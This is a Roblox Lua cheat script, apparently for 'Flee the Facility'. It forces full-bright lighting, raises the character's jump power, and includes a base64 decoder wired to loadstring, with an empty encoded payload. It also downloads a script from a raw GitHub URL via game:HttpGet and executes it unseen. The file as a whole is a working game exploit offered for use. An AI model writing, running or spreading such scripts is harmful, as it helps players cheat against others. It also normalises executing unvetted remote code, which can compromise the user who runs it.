local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function decode(data)
	local c,t=string.byte,{}
	for i=1,#data,4 do
		local a,b,c,d=string.find(b,data:sub(i,i),1,true)-1,
		              string.find(b,data:sub(i+1,i+1),1,true)-1,
		              string.find(b,data:sub(i+2,i+2),1,true)-1,
		              string.find(b,data:sub(i+3,i+3),1,true)-1
		local n=(a<<18)+(b<<12)+((c or 0)<<6)+(d or 0)
		t[#t+1]=string.char((n>>16)&255,(n>>8)&255,n&255)
	end
	return table.concat(t):gsub("%z+$","")
end

loadstring(decode(""))()

local Light = game:GetService("Lighting")

function dofullbright()
Light.Ambient = Color3.new(1, 1, 1)
Light.ColorShift_Bottom = Color3.new(1, 1, 1)
Light.ColorShift_Top = Color3.new(1, 1, 1)
end

dofullbright()

Light.LightingChanged:Connect(dofullbright)

loadstring(game:HttpGet("https://raw.githubusercontent.com/LeviTheOtaku/roblox-scripts/main/FTFHAX.lua",true))()

game.Players.LocalPlayer.Character.Humanoid.JumpPower = 36
